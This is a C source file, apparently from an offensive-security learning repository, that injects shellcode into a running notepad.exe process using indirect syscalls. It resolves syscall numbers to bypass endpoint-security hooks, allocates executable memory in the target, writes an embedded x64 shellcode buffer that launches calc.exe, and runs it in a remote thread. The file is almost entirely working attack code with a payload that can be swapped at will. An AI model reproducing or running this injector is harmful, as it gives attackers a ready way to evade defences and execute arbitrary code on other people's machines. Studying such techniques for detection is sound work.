/*
* ml64.exe /c indirect-syscalls.asm
* cl.exe indirect-syscalls-ex.c ..\includes\peb-eat-utils.c ..\includes\syscall-utils.c ..\includes\ps-utils.c indirect-syscalls.obj /Fe:indirect-syscalls.exe
*/
#include <stdio.h>
#include "..\includes\syscall-utils.h"
#include "..\includes\ps-utils.h"

DWORD wNtAllocateVirtualMemorySSN = 0;
UINT_PTR sysAddrNtAllocateVirtualMemory = 0;

DWORD wNtWriteVirtualMemorySSN = 0;
UINT_PTR sysAddrNtWriteVirtualMemory = 0;

DWORD wNtProtectVirtualMemorySSN = 0;

DWORD wNtCreateThreadExSSN = 0;
UINT_PTR sysAddrNtCreateThreadEx = 0;

DWORD wNtWaitForSingleObjectSSN = 0;
UINT_PTR sysAddrNtWaitForSingleObject = 0;

// https://ntdoc.m417z.com/NtAllocateVirtualMemory
NTSTATUS IndirectSysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,    
    PVOID* BaseAddress,      
    ULONG_PTR ZeroBits,      
    PSIZE_T RegionSize,      
    ULONG AllocationType,    
    ULONG Protect            
);

// https://ntdoc.m417z.com/NtWriteVirtualMemory
NTSTATUS IndirectSysNtWriteVirtualMemory(
    HANDLE ProcessHandle,     
    PVOID BaseAddress,        
    PVOID Buffer,             
    SIZE_T NumberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWritten 
);

// https://ntdoc.m417z.com/ntcreatethreadex
NTSTATUS IndirectSysNtCreateThreadEx(
    PHANDLE ThreadHandle,        
    ACCESS_MASK DesiredAccess,   
    PVOID ObjectAttributes,      
    HANDLE ProcessHandle,        
    PVOID lpStartAddress,        
    PVOID lpParameter,           
    ULONG Flags,                 
    SIZE_T StackZeroBits,        
    SIZE_T SizeOfStackCommit,    
    SIZE_T SizeOfStackReserve,   
    PVOID lpBytesBuffer          
);

// https://ntdoc.m417z.com/NtWaitForSingleObject
NTSTATUS IndirectSysNtWaitForSingleObject(
    HANDLE Handle,          
    BOOLEAN Alertable,      
    PLARGE_INTEGER Timeout  
);


int main(int argc, char* argv[]) {
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    DWORD pid = 0;
    const wchar_t* processName = L"notepad.exe";

    pid = FindPidByName(processName);
    if (pid == 0) {
        printf("[ERROR] Failed to obtain process ID!\n");
        return -1;
    }

    printf("[*] Running PI with target PID: %u\n", pid);

    PPEB pPeb = (PPEB)__readgsqword(0x60);

	// Dynamically find the SSNs from disk, bypassing memory hooks
	wNtAllocateVirtualMemorySSN = GetSSNByName(pPeb, "NtAllocateVirtualMemory");
	wNtWriteVirtualMemorySSN = GetSSNByName(pPeb, "NtWriteVirtualMemory");
	wNtProtectVirtualMemorySSN = GetSSNByName(pPeb, "NtProtectVirtualMemory");
	wNtCreateThreadExSSN = GetSSNByName(pPeb, "NtCreateThreadEx");
	wNtWaitForSingleObjectSSN = GetSSNByName(pPeb, "NtWaitForSingleObject");

	if (!wNtAllocateVirtualMemorySSN) {
		printf("[!] Error: Could not find clean SSNs from disk.\n");
		return -1;
	}

	printf("[+] SSNs Loaded: Allocate(0x%X), Write(0x%X), Protect(0x%X), CreateThread(0x%X), WaitForSingleObject(0x%X)\n",
		wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);	
	
	// Get a handle to the ntdll.dll library
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		return 1;
	}

	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
	UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");

	sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
	sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
	sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
	
    // Open a handle to the current process, this must be passed to VirtualAllocEx
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        return -1;
    }

    printf("[*] Successfully opened handle to PID: %u\n", pid);

    printf("[*] Waiting for thread with IndirectSysNtAllocateVirtualMemory.\n");
    PVOID bufferAddress = NULL;
	SIZE_T buffSize = sizeof(buf); 
	IndirectSysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    printf("[*] Waiting for thread with IndirectSysNtWriteVirtualMemory.\n");
	SIZE_T bytesWritten;
    IndirectSysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);

    printf("[*] Waiting for thread with IndirectSysNtCreateThreadEx.\n");
	HANDLE hThread;	
    IndirectSysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
	
    printf("[*] Waiting for thread with IndirectSysNtWaitForSingleObject.\n");
	IndirectSysNtWaitForSingleObject(hThread, FALSE, NULL);
    printf("[+] Process injection complete.\n");
    return 0;
}